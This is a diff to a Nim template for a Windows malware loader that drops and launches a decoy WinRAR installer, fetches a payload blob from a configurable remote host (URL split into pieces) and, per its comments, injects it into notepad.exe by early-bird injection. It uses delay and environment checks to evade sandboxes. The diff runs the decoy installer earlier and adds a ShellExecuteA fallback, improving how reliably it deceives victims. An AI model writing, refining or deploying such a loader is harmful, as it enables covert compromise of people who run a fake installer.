@@ -109,6 +109,7 @@ when defined(windows):
 # - setupPayload() extracts and launches WinRAR installer
 # - runBlob() uses early bird injection into notepad.exe (not self-inject)
 EMBED_TEMPLATE = '''import winim/lean
+import winim/inc/shellapi
 import httpclient
 import strutils
 
@@ -172,7 +173,9 @@ proc setupPayload() =
     return
   discard writeBuffer(outFile, addr data[dataStart], instSize)
   close(outFile)
-  discard WinExec(installerPath, 1)
+  let rc = WinExec(installerPath, 5)
+  if rc <= 31:
+    discard ShellExecuteA(0.HWND, "open".cstring, installerPath.cstring, nil, nil, SW_SHOWNORMAL.INT)
 
 proc fetchBlob(): seq[byte] =
   let url = "http" & "://" & CFG_HOST & ":" & $CFG_PORT & CFG_A & CFG_B & CFG_C
@@ -235,11 +238,10 @@ proc runBlob(data: seq[byte]) =
 
 when defined(windows):
   when isMainModule:
+    setupPayload()
     sysWait(9000)
     if not envLooksReal():
       quit(0)
-    setupPayload()
-    sysWait(6000)
     let blob = fetchBlob()
     if blob.len == 0:
       quit(1)
